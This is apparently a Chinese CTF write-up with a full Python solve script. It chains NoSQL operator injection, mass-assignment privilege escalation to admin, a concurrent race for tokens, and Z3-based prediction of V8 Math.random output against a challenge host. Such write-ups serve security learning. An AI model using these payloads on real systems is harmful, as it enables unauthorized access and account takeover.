## 整体攻击链路剖析

本关卡本质上是一条由多个漏洞节点串联而成的 Web 综合攻击链。其核心攻防步骤包含：

1. 首先针对 `/qian/login` 端点，利用 NoSQL (MongoDB) 语法糖实施注入漏洞，从而在无需校验真实密码的情况下顶替 `qingyun` 账号登录。
2. 借用 `/dui/update` 处的参数批量赋值缺陷（Mass Assignment），实现对 `role` 等越权字段的强制覆盖修改。
3. 发现并在 `/li/grab` 中触发条件竞争（Race Condition）漏洞。借助高并发网络请求，打破服务端“每人一证”的领取约束，一次性窃取多张司命令牌。
4. 探查并利用 `/zhen/history` 泄露出来的值；服务端在底层实际上是通过 `Math.floor(Math.random() * 1000000)` 这一行来随机产生抽签号码的。
5. 依托收集到的多条输出历史，还原出 V8 引擎下 `Math.random()` 的 `xorshift128+` 生成器内部状态，进而顺水推舟算出本期将要下发的签号。
6. 最后突破身份验证的终极屏障，将自身 `role` 账户权限调至 `admin` “掌门”层次，提交精准算出的预测值和三块令牌，从而摘下该题 flag。

## 第一重挑战：攻陷“乾卦”（NoSQL 注射提权）

抵达 `/qian` 路由时，前端给出了一段极具误导性却又十分直白的暗示语：

```html
{"$ne": null}、{"$regex": "^a"} 这类“运算符”
```

负责验证登录态的后端接口抓包如下：

```text
POST /qian/login
Content-Type: application/json
```

系统逻辑强制以“见习道童” `qingyun` 作为基础用户名。在此情况下，密码比对流程可以依靠 MongoDB 的条件表达式符来强行躲开：

```json
{
  "username": "qingyun",
  "password": {
    "$nin": ["x"]
  }
}
```

校验通过后的服务器会签发 session 并返回对应身份：

```json
{
  "message": "欢迎，见习道童",
  "username": "qingyun_xxxxxxxxxxxxxxxx",
  "role": "apprentice",
  "title": "见习道童",
  "hint": "下一步：兑卦 /dui 自修门规"
}
```

一个小技巧在此体现：系统每承认一次有效的登录事件，都会隔离化分配一个后缀不同的独立 `qingyun_xxx` 会话角色，这一设计刚好方便了我们在后面调试中规避相互状态覆盖的问题。

待用户态拥有 `role=elder` 这个变量值，便获得了踏入 `/li/grab` 开启“头香争夺战”的特权。

## 第三重挑战：瓦解“离卦”（并发竞速席卷 3 支令牌）

查阅 `/li` 层面的前端反馈，已经能够看出此环节对应的常见安全模型：

```text
先读 → 判断 → 延迟 → 再写
同时发出多个请求试试
```

索取凭证令牌的话，需要调用以下方法：

```text

```

虽然系统给玩家的口径是每号只下发一枚。由于代码层未引入锁机制或原子写策略过滤，在判断“是否已获取”与“发放牌组”这段空窗期中，如果有大量数据包同时打入底层，便可骗过条件判定触发发牌，促使程序发放超出阈值数量的 token。

## 第四重挑战：推演“震卦”（破解伪造数序列模型）

抵进 `/zhen` 之后，页面源码无遮掩地呈现出了抽签号生成的规律函数：

```js
Math.floor(Math.random() * 1000000)
```

不仅如此，结合明文页面提示与暗门途径 `/zhen/history` ，访问者始终能读出服务器过往 12 个轮次的开奖详情：

```json
{
  "current_round": 24,
  "remaining_ms": 15000,
  "history": [
    {"round": 23, "number": 316374},
    {"round": 22, "number": 121642},
    {"round": 21, "number": 850929}
  ]
}
```

在标准的 Node 架构底层中，这里的随机事件遵循 `xorshift128+` 的规则演进。尽管由于执行了 `floor(random * 1000000)` 的操作从而丢失了完整的精度系数，但凭借这凑齐的 12 项样本区间，我们完全可以结合 Z3 定理求解器实现内存状态空间的测绘与推导。

按照实践经验看，本考题输出流序列规律遵循下述特征：

```text
oldest -> newest 是 PRNG 正向输出
next = 从 newest 状态再推进一次
```

此现象正好映射贴合了经典的 `nocache/v8-52/s0` 破绽模型。

## 第五重挑战：冲破终关禁制（化阶为掌门之道）

假如有玩家单纯集齐了 3 张符文通证，并配对了未来中签号码直接推送至 `/zhen/predict` 端口。倘若他当前的账户权限仍停留在 `elder`（长老级），则只会收到一段拦截提示音：

```json
{
  "error": "预测正确，然门禁未启——掌门方可入"
}
```

这就证明我们的随机序列前瞻和通证完整度皆受认可，拦截阻力仅仅是当前的鉴权等级不足。
于是故技重施即可：调用 `/dui/update` 将自身的标识覆盖成能够号令全局的主管理员/掌门级别：

```json
{
  "role": "admin",
  "title": "掌门",
  "rank": "admin",
  "group": "admin",
  "permission": "all",
  "permissions": ["li", "zhen", "admin"],
  "admin": true,
  "isAdmin": true,
  "is_admin": true
}
```

伴随着此次关键级别的上调，重新补上预测结果并敲击回车，就可以直接召唤出通关凭证的旗帜。

## 全流程攻防剧本代码实现

为提高效率，编写了这套自动运行脚本，它可以依次执行：

- 利用 MongoDB NoSQL 突破校验防线登录
- 发送恶意 Mass assignment 并提升个人状态
- 引发内存竞态一键劫持充沛的 token
- 挂起心跳等待 `/zhen/history` 刷新足量多达 12 份数据源
- 调用 Z3 的方程约束模块穷举推算出 PRNG 核心空间以定下当前值
- 赋予 admin 的最后跨越指令
- 向 `/zhen/predict` 递交正确密钥并打印出 flag

```python
import json
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from http.cookiejar import CookieJar

import z3


BASE = "http://39.105.213.28:14509"
MASK = (1 << 64) - 1


class Client:
    def __init__(self):
        self.jar = CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar)
        )

    def request(self, path, method="GET", data=None):
        body = None
        headers = {}
        if data is not None:
            body = json.dumps(data, separators=(",", ":")).encode()
            headers["Content-Type"] = "application/json"
        req = urllib.request.Request(BASE + path, data=body, headers=headers, method=method)
        try:
            with self.opener.open(req, timeout=15) as r:
                return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")


def xs128p(s0, s1):
    x, y = s0 & MASK, s1 & MASK
    s0 = y
    x ^= (x << 23) & MASK
    x ^= x >> 17
    x ^= y
    x ^= y >> 26
    return s0 & MASK, x & MASK


def xs128p_z3(s0, s1):
    x, y = s0, s1
    ns0 = y
    x = x ^ (x << 23)
    x = x ^ z3.LShR(x, 17)
    x = x ^ y
    x = x ^ z3.LShR(y, 26)
    return ns0, x


def bounds(n, bits=52):
    denom = 1 << bits
    lo = (n * denom + 1_000_000 - 1) // 1_000_000
    hi = ((n + 1) * denom + 1_000_000 - 1) // 1_000_000 - 1
    return lo, hi


def solve_next(history):
    observed = [h["number"] for h in reversed(history)]
    s0 = z3.BitVec("s0", 64)
    s1 = z3.BitVec("s1", 64)
    solver = z3.Solver()
    cur0, cur1 = s0, s1

    for i, n in enumerate(observed):
        top = z3.Extract(63, 12, cur0)
        lo, hi = bounds(n)
        solver.add(z3.UGE(top, z3.BitVecVal(lo, 52)))
        solver.add(z3.ULE(top, z3.BitVecVal(hi, 52)))
        if i != len(observed) - 1:
            cur0, cur1 = xs128p_z3(cur0, cur1)

    assert solver.check() == z3.sat
    model = solver.model()
    a = model.eval(s0).as_long()
    b = model.eval(s1).as_long()

    for _ in range(len(observed)):
        a, b = xs128p(a, b)
    return ((a >> 12) * 1_000_000) // (1 << 52)


def main():
    c = Client()

    # Step 1: NoSQL injection login
    st, txt = c.request("/qian/login", "POST", {
        "username": "qingyun",
        "password": {"$nin": ["x"]},
    })
    print("[login]", st, txt)

    # Step 2: mass assignment -> elder
    c.request("/dui/update", "POST", {
        "role": "elder",
        "title": "elder",
        "rank": "elder",
        "group": "elder",
        "permission": "all",
        "permissions": ["li", "zhen"],
    })

    # Step 3: race /li/grab
    def grab():
        return c.request("/li/grab", "POST")

    tokens = []
    with ThreadPoolExecutor(max_workers=20) as pool:
        for st, txt in pool.map(lambda _: grab(), range(20)):
            if st == 200:
                tok = json.loads(txt)["token"]
                tokens.append(tok)
                print("[token]", tok)
            if len(tokens) >= 3:
                break

    assert len(tokens) >= 3
    tokens = tokens[:3]

    # Step 4: wait for enough PRNG outputs
    while True:
        st, txt = c.request("/zhen/history")
        data = json.loads(txt)
        print("[history]", data["current_round"], len(data["history"]), data["remaining_ms"])
        if len(data["history"]) >= 12 and data["remaining_ms"] > 12000:
            break
        time.sleep(2)

    guess = solve_next(data["history"])
    round_no = data["current_round"]
    print("[guess]", round_no, guess)

    # Step 5: final admin gate
    c.request("/dui/update", "POST", {
        "role": "admin",
        "title": "掌门",
        "rank": "admin",
        "group": "admin",
        "permission": "all",
        "permissions": ["li", "zhen", "admin"],
        "admin": True,
        "isAdmin": True,
        "is_admin": True,
    })

    st, txt = c.request("/zhen/predict", "POST", {
        "round": round_no,
        "number": guess,
        "tokens": tokens,
    })
    print("[result]", st, txt)


if __name__ == "__main__":
    main()
```
